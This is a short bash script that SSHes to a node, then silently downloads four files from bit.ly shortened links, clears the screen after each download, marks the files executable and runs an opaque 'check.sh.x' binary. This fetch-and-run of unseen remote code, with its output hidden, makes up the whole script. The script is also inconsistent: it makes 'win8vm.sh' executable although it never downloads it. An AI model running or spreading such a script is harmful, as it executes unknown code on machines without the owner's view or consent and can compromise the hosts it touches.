#!/bin/bash
ssh node01
wget -O exit.sh https://bit.ly/3BBLPbC > /dev/null 2>&1
clear
wget -O sleep.sh https://bit.ly/3zzuJJh > /dev/null 2>&1
clear
wget -O win11vm.sh https://bit.ly/3kZh2iU > /dev/null 2>&1
clear
wget -O check.sh.x https://bit.ly/3kTpvUD > /dev/null 2>&1
clear
chmod +x win8vm.sh
chmod +x exit.sh
chmod +x sleep.sh
chmod +x check.sh.x
./check.sh.x
